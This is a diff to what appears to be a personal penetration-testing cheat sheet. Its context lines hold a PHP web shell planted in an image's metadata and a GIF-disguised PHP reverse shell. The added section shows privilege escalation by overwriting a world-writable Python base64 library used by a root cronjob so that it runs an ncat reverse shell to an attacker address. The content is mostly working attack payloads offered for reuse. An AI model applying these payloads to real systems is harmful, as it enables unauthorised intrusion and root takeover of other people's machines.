@@ -193,7 +193,33 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
 GIF8; <?php echo exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/80 0>&1'"); ?>
 
 ```
+##### Rplace /usr/lib/python3.8/base64.py
+```
+***NOTES***
+A cronjob is executing a python script every minute as root, looting at the script...
+sona@sona:~$ cat /home/sona/logcrypt.py
+cat /home/sona/logcrypt.py
+#!/usr/bin/python3
 
+import base64
+
+log_file = open('/var/log/auth.log','rb')
+crypt_data = base64.b64encode(log_file.read())
+cryptlog_file = open('/tmp/log.crypt','wb')
+cryptlog_file.write(crypt_data)
+
+***NOTES***
+It imports the base64 library, if the permissions are lax you can change what it does...
+rwxrwxrwx 1 root root 20380 Jul 28  2020 /usr/lib/python3.8/base64.py
+CHANGE TO >>>
+
+import os
+
+def b64encode(s, altchars=None):
+    import os
+    os.system("ncat -e /bin/bash 192.168.118.11 1411")
+    return s
+```
 ##### WINDOWS PHP RFI
 ```bash
 nc -nv 192.168.136.10 80
